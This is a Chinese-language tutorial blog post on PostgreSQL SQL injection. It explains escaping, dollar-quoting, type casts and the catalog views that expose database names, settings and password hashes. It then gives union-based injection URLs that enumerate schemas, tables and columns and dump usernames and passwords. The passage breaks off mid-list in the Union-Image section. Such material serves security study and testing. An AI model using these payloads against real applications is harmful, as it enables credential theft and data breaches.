  </entry>
  <entry>
    <title>PostgreSQL数据库注入攻击方式</title>
    <url>/post/1853c6b8.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="PostgreSQL数据库的基本知识"><a href="#PostgreSQL数据库的基本知识" class="headerlink" title="PostgreSQL数据库的基本知识"></a>PostgreSQL数据库的基本知识</h2><h3 id="PostgreSQL数据库介绍"><a href="#PostgreSQL数据库介绍" class="headerlink" title="PostgreSQL数据库介绍"></a>PostgreSQL数据库介绍</h3><p>PostgreSQL 是一个免费的对象-关系数据库服务器 (ORDBMS)，在灵活的 BSD 许可证下发行。PostgreSQL 的 Slogan 是 “世界上最先进的开源关系型数据库”。PostgerSQL也简称Postgres。</p>
<p>Postgres在国内并不常见，但在国外的流行程度却不亚于MySQL。</p>
<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>Postgres的基本语法与MySQL类似，如果对手工注入或SQL语法有较多了解不会有任何困难。</p>
<h4 id="堆叠查询与代码块"><a href="#堆叠查询与代码块" class="headerlink" title="堆叠查询与代码块"></a>堆叠查询与代码块</h4><ul>
<li><p>Postgres 支持多行查询,语句间的分隔符为分号<code>;</code>，同时也只有分号是合法的分隔符。</p>
</li>
<li><p>如果多行执行的语句中有超过一个语句会返回结果集，在命令行或者C#查询会执行前一个，在PHP中查询会执行后一个（虽然我也不知道是什么原理，但查询结果就是这样~）。</p>
</li>
<li><p>Postgres 支持以 begin;开始，以 end;结束的代码块,但代码块内执行的语句不会有任何返回结果。同时如果代码块之前一条语句会返回结果，则先前语句返回的结果集会被覆盖(即不返回任何结果)。</p>
</li>
<li><p>Postgres 支持以 begin;开始，以 end;结束的代码块,但代码块内执行的语句不会有任何返回结果。同时如果代码块之前一条语句会返回结果，则先前语句返回的结果集会被覆盖(即不返回任何结果)。</p>
<p>例如:执行查询语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">begin</span>;<span class="keyword">select</span> <span class="number">2</span>;<span class="keyword">end</span>;</span><br><span class="line"># 不会返回任何结果集(在PHP查询中)</span><br><span class="line"><span class="keyword">begin</span>;<span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">end</span>;<span class="keyword">select</span> <span class="number">2</span>;</span><br><span class="line"># 返回<span class="number">2</span>(在PHP查询中)</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Limit"><a href="#Limit" class="headerlink" title="Limit"></a>Limit</h4><p>在 postgres 中，limit 的语法为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> [field list] <span class="keyword">from</span> [<span class="keyword">table</span>] limit count <span class="keyword">offset</span> <span class="keyword">start</span>;</span><br></pre></td></tr></table></figure>

<p>其中 start 为起始位置(以 0 开始),count 为总数。</p>
<h4 id="Unknown类型"><a href="#Unknown类型" class="headerlink" title="Unknown类型"></a>Unknown类型</h4><p>Postgres 输入的所有字符串都被认为是 Unknown 类型。也就是输入本身是未定义类型，由数据库根据操作进行匹配转换,如果匹配失败则报错。</p>
<p>Unknown 类型有两种输入模式：<strong>单引号转义模式</strong>与<strong>美元符逃逸模式</strong>。</p>
<h5 id="单引号转义模式"><a href="#单引号转义模式" class="headerlink" title="单引号转义模式"></a>单引号转义模式</h5><p>在单引号转义模式中允许使用前缀 `<span style="color: red;">E</span>/<span style="color: blue;">U&amp;</span>/<span style="color: green;">B/X</span> 表示<span style="color: red;">转义字符串</span>/<span style="color: blue;">Unicode 字符串</span>/<span style="color: green;">位串</span>，其中 <span style="color: red;">E 表示进行 c 语言风格的转义</span>，<span style="color: blue;">U 表示进行 Unicode 转义，并支持自定义转义符</span>,<span style="color: green;">B 和 X 代表后续跟随的是一个 bit 序列</span>。例如以下查询都将返回制表符(0x09):</p>
<p>例如以下查询都将返回制表符(0x09)：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> E<span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> E<span class="string">&#x27;\011&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> E<span class="string">&#x27;\x09&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> E<span class="string">&#x27;\u0009&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> U<span class="operator">&amp;</span><span class="string">&#x27;\0009&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> U<span class="operator">&amp;</span><span class="string">&#x27;!0009&#x27;</span> <span class="keyword">uescape</span> <span class="string">&#x27;!&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>以 U&amp;为前缀、双引号包含的字符串会作为表名、字段名与函数名等关键字使用。例如:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> U<span class="operator">&amp;</span>&quot;\0061&quot; <span class="keyword">from</span> test;		 					<span class="comment">--等同于 select a from test</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> a <span class="keyword">from</span> U<span class="operator">&amp;</span>&quot;!0074est&quot; <span class="keyword">uescape</span> <span class="string">&#x27;!&#x27;</span>;		 		<span class="comment">--等同于 select a from test</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> U<span class="operator">&amp;</span>&quot;!0063hr&quot; <span class="keyword">uescape</span> <span class="string">&#x27;!&#x27;</span> (<span class="number">97</span>);				<span class="comment">--返回 a,等同于 select chr(97)</span></span><br></pre></td></tr></table></figure>

<p>B 和 X 会将其后跟随的字符串转换为 bit 序列(即二进制数)，例如以下查询都将返回 bit 值 01010101(如果是在 php 或查询分析器中查询，则返回字符串 01010101)：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> B<span class="string">&#x27;01010101&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> X<span class="string">&#x27;55&#x27;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：在 postgres 中由一个名为 <code>standard_conforming_strings</code> 的变量控制在没有任何前缀时是否自动进行 c 语言风格的转义。这个变量是一个 text 型的字符串，如果值为 on，则表示只有以 postgres 风格显式声明转义前缀的字符串会进行转义，如果不加前缀的话，则不会进行任何转义(除了两个单引号会被转 换为单引号之外)；如果值为 off，则表示没有任何前缀的字符串将自动进行 c 语言风格转义。这个值在 9.1之前的版本为 off，而在 9.1 及之后的版本为 on。</p>
<p>例如，在 <code>standard_conforming_strings</code> 为 on 时,以下查询会成功执行并返回反斜杠:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;\&#x27;;</span><br></pre></td></tr></table></figure>

<p>而在为 off 时,则会出现“未结束的引号字串”的错误信息。</p>
</blockquote>
<h5 id="美元符号逃逸模式"><a href="#美元符号逃逸模式" class="headerlink" title="美元符号逃逸模式"></a>美元符号逃逸模式</h5><p>美元符逃逸模式是 postgres 专有的字符串声明格式，其目的是为了避免由于字符串中包含大量的反斜杠或单引号而进行的转义，其构成方式由一个美元符号<code>$</code>，一个可选的零个或多个字符“记号”，另外一个美元符号，一个组成字串常量的任意字符的序列，一个美元符号，以及一个和开始这个美元符包围的记号相同的记号，和一个美元符号组成。例如以下查询均返回单引号：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> $$<span class="string">&#x27;$$;</span></span><br><span class="line"><span class="string">select $tag$&#x27;</span>$tag$;</span><br></pre></td></tr></table></figure>

<p>在美元符逃逸模式中没有任何字符串需要转义，也没有任何字符串会被转义，转义字符与前缀均不可用。唯一要注意的是被转义字符中不能出现与包围这些字符串的记号相同的字符串，例如上例中第二个语句中的字符绝不能出现<code>$tag$</code>，否则会在出现<code>$tag$</code>的地方截断，同时将之后的字符串作为查询的别名。如果查询的别名也由<code>$....$</code>开始，同时没有匹配的结束标记，则会返回一个错误。</p>
<p>例如以下查询返回单引号，同时将指定别名 <code>test$tag$</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> $tag$<span class="string">&#x27;$tag$test$tag$;</span></span><br></pre></td></tr></table></figure>

<p>而以下语句会返回“未结束的$符号引用的字符串”的错误信息：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> $tag$<span class="string">&#x27;$tag$$test$tag$;</span></span><br></pre></td></tr></table></figure>

<h4 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h4><p>Postgres 支持两种数据类型转换方式：使用 <code>cast</code> 语句或<code>::</code>运算符。</p>
<p>cast 语句的语法为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cast</span>([field<span class="operator">/</span><span class="keyword">value</span>] <span class="keyword">as</span> type)</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">cast</span>( <span class="string">&#x27;1&#x27;</span> <span class="keyword">as</span> <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line"># 返回数字 <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><code>::</code>运算符用于值或字段之后，效果同<code>cast</code>，但在语法上简便许多，在需要进行多次转换进行报错的时候无疑是很方便的。</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;1&#x27;</span>::text::<span class="type">int</span>;</span><br><span class="line"></span><br><span class="line"># 返回数字 <span class="number">1</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：在 Postgres 中,转换会先判断类型,某些类型之间是不能互相转换的(例如 bytea 和 int)，但几乎所有的类型都可以转换为 text。这样通过转为 text 再转为 int 的双次类型转换报错在注入中相当有用。</p>
</blockquote>
<h3 id="Schema与目录对象"><a href="#Schema与目录对象" class="headerlink" title="Schema与目录对象"></a>Schema与目录对象</h3><p>关系型数据库一般都有着存放库、表、字段之间对应关系的表(或视图)，postgres也不例外。</p>
<p>所不同的是 postgres 多出一个 Schema 对象,这也是 postgres 与其他数据库最大的几个不同点之一。</p>
<h4 id="什么是-Schema？"><a href="#什么是-Schema？" class="headerlink" title="什么是 Schema？"></a>什么是 Schema？</h4><p><code>Schema</code> 是 Postgres 中的一个特殊对象，<code>Schema</code> 可以看作一个数据库中单独分割出的独立的数据库系统。利用 <code>Schema</code> 可以进行权限划分或水平的功能分割操作。</p>
<p>由于 Postgres 认为数据库是一个独立的个体，所以跨库操作是不允许的。但 <code>Schema</code> 属于数据库本身的一部分，所以跨 Schema 读取数据是完全可行的(前提是需要拥有读取的权限)。</p>
<p>跨 Schema 读取数据有两种方式，第一种是类似于 mysql 跨库查询的语句，例如执行查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Manager.admin;</span><br><span class="line"></span><br><span class="line"># 返回 Manager Schema 中表 admin 的内容。</span><br></pre></td></tr></table></figure>

<p>或者使用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> search_path <span class="keyword">to</span> [Schema Name];</span><br></pre></td></tr></table></figure>

<p>修改查询路径。</p>
<p>例如执行：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> search_path <span class="keyword">to</span> manager;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin;</span><br><span class="line"></span><br><span class="line">#也将返回 Manager Schema 中表 admin 的内容。</span><br></pre></td></tr></table></figure>

<p>注意：这条语句在注入中不会起到任何作用。</p>
<p>另：默认使用的 <code>Schema</code> 名称为 <code>public</code>，这是 postgres 建立一个数据库时自动生成的 <code>Schema</code>。</p>
<p>Postgres 中有一种名为目录的特殊的 <code>Schema</code>，它由系统在建立数据库时生成。目录所包含的对象叫目录对象，可以理解为 <code>Schema</code> 中的表；目录对象中包含字段。</p>
<p>默认情况下会生成两个目录：<code>pg_catalog</code> 和 <code>information_schema</code>。<code>pg_catalog</code> 中存放当前数据库的对象，例如系统函数、默认视图、大对象等。</p>
<p><code>information_schema</code> 存放的则是当前数据库的架构信息。</p>
<h4 id="通过-pg-catalog-获取数据库关键信息"><a href="#通过-pg-catalog-获取数据库关键信息" class="headerlink" title="通过 pg_catalog 获取数据库关键信息"></a>通过 pg_catalog 获取数据库关键信息</h4><h5 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h5><p>所有的数据库名称存放于 <code>pg_database</code> 目录对象的 <code>datname</code> 字段中,这个目录对象与字段任何用户均可读取。</p>
<p>例如：以下语句会返回所有的数据库名称。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> datname <span class="keyword">from</span> pg_database;</span><br></pre></td></tr></table></figure>

<p>注意：名称以 <code>template</code> 开头的数据库为 postgres 自动生成的临时数据库,不需要理会。</p>
<h5 id="获取数据库文件信息"><a href="#获取数据库文件信息" class="headerlink" title="获取数据库文件信息"></a>获取数据库文件信息</h5><p>数据库的配置信息储存于 <code>pg_settings</code> 目录对象中，其中 <code>name</code> 字段为设置选项的名称，<code>setting</code> 字段为选项的值。</p>
<p>这些配置信息中最为重要的便是几个目录信息：数据库文件目录(<code>data_directory</code>)与数据库认证配置文件路径(<code>hba_file</code>)，不过只有在 super 权限下才能进行读取。</p>
<p>例如，使用以下语句会返回以上两个目录信息(需要 super 权限)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name,setting <span class="keyword">from</span> pg_settings <span class="keyword">where</span> name <span class="keyword">in</span> (<span class="string">&#x27;hba_file&#x27;</span>,<span class="string">&#x27;data_directory&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="获取数据库用户信息"><a href="#获取数据库用户信息" class="headerlink" title="获取数据库用户信息"></a>获取数据库用户信息</h5><p>数据库的用户信息存放于 <code>pg_authid</code> 目录对象中，只有在 super 权限下才能进行读取(super 可以看作是 mssql 中的 sysadmin，是 postgres 中最高的权限组；无论何时，postgres 用户总拥有最高的权限)。这个目录对象记录了所有的用户信息，最为重要的是用户名及加密后的密码。其中用户名储存于 <code>rolname</code> 字段,密码储存于 <code>rolpassword</code> 字段。</p>
<p>使用以下语句可以查询出数据库所有的用户与加密后的密码：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> rolname,rolpassword <span class="keyword">from</span> pg_authid;</span><br></pre></td></tr></table></figure>

<p>注：postgres 密码加密方式为 ‘md5’+md5（密码+用户名）</p>
<p><code>pg_user</code> 是一个视图，其中映射了 <code>pg_shadow</code> 视图(这个视图映射了 <code>pg_authid</code> 的部分字段)的内容。除了密码被替换为一串星号,其余的数据完全相同。</p>
<p>事实上我们只需要关心这个视图内的一个字段：usesuper，这个字段为一个布尔值，表明是否为 super用户。</p>
<p>例如，使用以下语句即可判断当前用户是否具有 super 权限:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> usesuper <span class="keyword">from</span> pg_user <span class="keyword">where</span> usename<span class="operator">=</span><span class="built_in">current_user</span>;</span><br></pre></td></tr></table></figure>



<h4 id="通过-information-schema-获取数据库架构信息"><a href="#通过-information-schema-获取数据库架构信息" class="headerlink" title="通过 information_schema 获取数据库架构信息"></a>通过 information_schema 获取数据库架构信息</h4><p>和 mysql 类似，postgres 中也有储存数据库表段与字段的 <code>information_schema</code> 对象，所不同的是 mysql中的 <code>information_schema</code> 是独立的数据库，而在 postgres 中为在数据库中共享的目录对象。</p>
<p>information_schema 目录存放了当前数据库全部的架构信息，例如全部的表名，表中全部的字段，字段之间的关系等等。在注入利用中，最需要关心的只有三点:所有的 Schema、所有的表与其所属的 Schema、所有的字段与其所属的表。</p>
<p>所有的 Schema 信息存放于 <code>schemata</code> 目录对象中，<code>schema_name</code> 字段存放的就是 Schema 的名称(可以看到 <code>information_schema</code> 也在其中)。不过很遗憾，非 super 权限不能从这个目录对象中读取到任何内容。</p>
<p>所有的表名存放于 tables 目录对象中，所有的字段名存放于 columns 目录对象中，这两个表在非 super用户下也可以进行读取操作。</p>
<p>这两个表均包含 <code>table_schema</code> 字段，用以表示所属的 Schema。这样利用以下语句即可<strong>获取完整的Schema 信息</strong>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;pg_catalog&#x27;</span>,<span class="string">&#x27;information_schema&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>所有表信息则存放于 tables 目录对象的 <code>table_name</code> 字段中,使用以下语句即可查询出<strong>所有的用户表</strong>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;pg_catalog&#x27;</span>,<span class="string">&#x27;information_schema&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>所有字段信息则存放于 columns 目录对象的 <code>column_name</code> 字段中，同时由 <code>table_name</code> 字段记录对应的表名。使用以下语句即可查询出所属于 <code>Manager.admin</code> 的<strong>所有字段</strong>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;manager&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>



<h3 id="常用SQL语句总结"><a href="#常用SQL语句总结" class="headerlink" title="常用SQL语句总结"></a>常用SQL语句总结</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 获取安装目录下的文件</span><br><span class="line"><span class="keyword">select</span> pg_ls_dir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># 获取数据库的IP地址</span><br><span class="line"><span class="keyword">select</span> inet_server_addr();</span><br><span class="line"></span><br><span class="line"># 获取当前数据库用户名</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">CURRENT_USER</span>;</span><br><span class="line"></span><br><span class="line"># 显示当前用户及是否为Super权限</span><br><span class="line"><span class="keyword">select</span> concat_ws(<span class="string">&#x27;:&#x27;</span>,usename,usesuper::text) <span class="keyword">from</span> pg_user <span class="keyword">where</span> usename<span class="operator">=</span><span class="built_in">current_user</span>;</span><br><span class="line"></span><br><span class="line"># 获取数据库版本</span><br><span class="line"><span class="keyword">select</span> version();</span><br><span class="line"></span><br><span class="line"># 获取当前数据库</span><br><span class="line"><span class="keyword">select</span> current_database();</span><br><span class="line"></span><br><span class="line"># 获取所有数据库</span><br><span class="line"><span class="keyword">select</span> datname <span class="keyword">from</span> pg_database;</span><br><span class="line"></span><br><span class="line"># 获取当前schema</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">CURRENT_SCHEMA</span>;</span><br><span class="line"></span><br><span class="line">#获取当前数据库的所有schema</span><br><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;pg_catalog&#x27;</span>,<span class="string">&#x27;information_schema&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"># 获取所有表名</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;pg_catalog&#x27;</span>,<span class="string">&#x27;information_schema&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"># 获取所有字段名</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;manager&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 获取数据</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">array</span>(<span class="keyword">select</span> <span class="type">row</span>(username,password) <span class="keyword">from</span> &quot;Users&quot;);</span><br><span class="line"></span><br><span class="line"># 显示所有 Schema、表、字段并按照对应关系进行排列(仅用于多行执行可用的情况下)</span><br><span class="line"><span class="keyword">with</span> a <span class="keyword">as</span> (<span class="keyword">select</span> table_name tname,<span class="built_in">array_agg</span>(column_name::text)cname,<span class="built_in">array_agg</span>(table_schema::text)sname <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">&#x27;pg_catalog&#x27;</span>,<span class="string">&#x27;information_schema&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span>),b <span class="keyword">as</span>(<span class="keyword">select</span> <span class="built_in">unnest</span>(sname)sname,tname,<span class="built_in">unnest</span>(cname)cname <span class="keyword">from</span> a <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>)<span class="keyword">select</span> <span class="keyword">array</span>(<span class="keyword">select</span> <span class="type">row</span>(sname,tname,cname)::text <span class="keyword">from</span> b);</span><br><span class="line"></span><br><span class="line"># 显示所有 Schema、表、字段并按照对应关系进行排列(任意情况均可用)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">array</span>(<span class="keyword">select</span> <span class="type">row</span>(sname,tname,cname)::text <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">unnest</span>(sname)sname,tname,<span class="built_in">unnest</span>(cname)cname <span class="keyword">from</span> (<span class="keyword">select</span> table_name tname,<span class="built_in">array_agg</span>(column_name::text)cname,<span class="built_in">array_agg</span>(table_schema::text)sname <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">&#x27;pg_catalog&#x27;</span>,<span class="string">&#x27;information_schema&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span> )a <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>)b);</span><br></pre></td></tr></table></figure>



<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>联合注入的特点是数据库通过执行 Union Select 语句返回的结果集中有一行或多行会被 web 应用程序处理并返回结果，也是最常见最常用的注入方式。</p>
<p>联合注入根据显示方式可以分为 Union-Select、Union-List、Union-Image、Union-Download 四种，其中由于前两种极为常见这里一笔带过,重点对Union-Image和Union-Download 两种较为少见的注入点体现进行讲解。</p>
<p>Postgres 在进行联合查询操作时对<strong>数据类型是敏感的</strong>,如果类型不匹配的话，则会返回“Union类型的类型 XXX 与 XXXX 不匹配”的错误。由于 Unknown 类型可以转换为绝大多数类型，所以可以使用’1’,’2’,’3’……代替1,2,3,从而实现自动匹配。</p>
<blockquote>
<p>注：不建议用 null 进行匹配，因为有时可能会因此导致缺少一个甚至多个重要的输出位置,用单引号或美元符引起的字符串作为替代是最好不过的做法了。</p>
</blockquote>
<blockquote>
<p>联合注入常用函数：</p>
<ul>
<li>concat() &amp; concat_ws()：在查询多个字段时,可以使用 <code>concat_ws()</code> 或 <code>concat()</code> 函数将多个字段的结果聚合到一起。这两个函数在使用上与 mysql 与之同名的两个函数没有任何不同。</li>
<li>row()：当需要将某一行中几个字段聚合到一起时，可以使用 <code>row()</code>函数。</li>
<li>array_agg()：在需要将某个字段的值聚合到一行时，可以使用 <code>array_agg()</code> 函数。</li>
<li>array()：当需要把某个查询的结果集作为一行输出时,可以使用 <code>array()</code> 函数。</li>
</ul>
</blockquote>
<h3 id="Union-Select注入"><a href="#Union-Select注入" class="headerlink" title="Union-Select注入"></a>Union-Select注入</h3><p>payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 获取当前数据库</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> current_database()),<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 获取当前schema</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="built_in">CURRENT_SCHEMA</span>),<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 获取schema为public的第<span class="number">1</span>张表名</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>),<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 获取schema为public的第<span class="number">2</span>张表名</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>),<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 获取public.Users的第<span class="number">1</span>个字段名</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;Users&#x27;</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>),<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 获取public.Users的第<span class="number">2</span>个字段名</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;Users&#x27;</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>),<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 获取public.User表的数据</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> concat_ws(<span class="string">&#x27;--&#x27;</span>,username,password) <span class="keyword">from</span> public.&quot;Users&quot; limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>),<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<h3 id="Union-List注入"><a href="#Union-List注入" class="headerlink" title="Union-List注入"></a>Union-List注入</h3><p>顾名思义，Union-List 型注入点所在脚本文件会遍历查询返回的结果集中每一行，并在将其处理后输出到页面。</p>
<p>Union-Select与Union-List的区别在于前者只能查询一行，而后者可以查询多行。</p>
<p>例如：访问</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">List.php?type<span class="operator">=</span>article<span class="string">&#x27; union select  1111,&#x27;</span><span class="number">2222</span><span class="string">&#x27;,&#x27;</span><span class="number">3333</span><span class="string">&#x27;,&#x27;</span><span class="number">4444</span><span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>

<p>会发现列表中多出了一条名为 3333 的项,同时其链接指向 1111,可以确认 1、3 为两个显示位。</p>
<p>此时访问：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">List.php?type<span class="operator">=</span>article<span class="string">&#x27; and 1=2 union select 1,&#x27;&#x27;,table_schema,&#x27;&#x27; from information_schema.tables where table_schema not in (&#x27;</span>pg_catalog<span class="string">&#x27;,&#x27;</span>information_schema<span class="string">&#x27;) --+</span></span><br></pre></td></tr></table></figure>

<p>即可列出所有的 Schema</p>
<p>具体payload构造参考Union-Select，不做详解。</p>
<h3 id="Union-Image注入"><a href="#Union-Image注入" class="headerlink" title="Union-Image注入"></a>Union-Image注入</h3><p>一种特殊的 Union-Select 型联合注入，这里暂时称之为 Union-Image 型注入。这种注入的主要不同点在于数据库中储存的字段不是常见的数值或字符串,而是 bytea 型数据(类似于 MSSQL 中image 类型)。bytea 可以看作是字节数组(byte-array),由于 postgres 允许将 <code>varchar/text</code> 类型转换为bytea,同时也可以自动从 Unknown 类型进行转换(执行这两种转换时,会将字符串代表的内容转换为对应的以数据库默认字符编码转换后的值,默认为 UTF8),所以实际在注入时并没有太明显的区别。</p>
<p>要注意的事项有两点：</p>
<ol>
